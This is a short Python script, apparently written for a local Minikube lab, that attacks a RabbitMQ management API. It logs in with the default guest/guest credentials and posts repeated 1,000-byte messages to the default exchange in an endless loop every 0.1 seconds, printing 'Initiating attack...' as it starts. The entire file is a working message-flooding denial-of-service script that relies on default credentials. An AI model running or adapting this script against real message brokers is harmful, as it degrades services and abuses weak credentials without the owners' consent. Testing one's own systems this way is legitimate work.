import requests
import time

def attack_rabbitmq():
    # Get the Minikube IP dynamically or set it manually if not using Minikube
    minikube_ip = '192.168.49.2'  # Use the actual Minikube IP, you can also fetch it dynamically if needed

    # Configuration
    rabbitmq_url = f'http://{minikube_ip}:31000/api/exchanges/%2f/amq.default/publish'
    username = 'guest'  # Default username; change as needed
    password = 'guest'  # Default password; change as needed
    payload_size = 1000  # Size of the payload in bytes

    # Crafting a large message
    message = {
        "properties": {},
        "routing_key": "test",
        "payload": "A" * payload_size,  # Repeat 'A' to create a large message
        "payload_encoding": "string"
    }

    # Headers
    headers = {'content-type': 'application/json'}
    print("Initiating attack...")

    while True:
        try:
            print("I am trying Jennifer")
            # Send the request
            response = requests.post(rabbitmq_url, json=message, auth=(username, password), headers=headers)

            # Output the response
            print('Status Code:', response.status_code)
            print('Response:', response.text)

        except requests.exceptions.RequestException as e:
            # Print the error and continue with the next iteration
            print("An error occurred:", str(e))

        # Wait a bit before sending again
        time.sleep(0.1)  # adjust timing as necessary

# Run the attack
attack_rabbitmq()
